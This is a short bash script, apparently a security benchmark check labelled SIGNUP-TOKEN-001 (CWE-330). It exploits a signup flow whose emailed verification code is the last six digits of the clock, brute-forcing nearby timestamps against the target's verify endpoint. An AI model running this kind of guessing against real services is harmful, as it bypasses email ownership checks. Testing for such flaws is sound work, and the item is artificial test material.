#!/usr/bin/env bash
# SIGNUP-TOKEN-001 (CWE-330): the emailed verification code is the last 6 digits
# of the wall clock, so it can be recomputed instead of received.
set -eu; . "$(dirname "$0")/_lib.sh"
DRAFT=$(curl -s -X POST "$TARGET/api/signup/start" -H 'content-type: application/json' \
  -d "{\"email\":\"predict-$$@bench.local\"}" | jget draftId)
[ -n "$DRAFT" ]
for OFF in 0 -1 1 -2 2 -3 3; do
  CODE=$(python3 -c "import time;print(str(int(time.time())+$OFF)[-6:])")
  OK=$(curl -s -X POST "$TARGET/api/signup/verify" -H 'content-type: application/json' \
    -d "{\"draftId\":$DRAFT,\"code\":\"$CODE\"}" | grep -c '"ok":true' || true)
  [ "$OK" = "1" ] && exit 0
done
exit 1
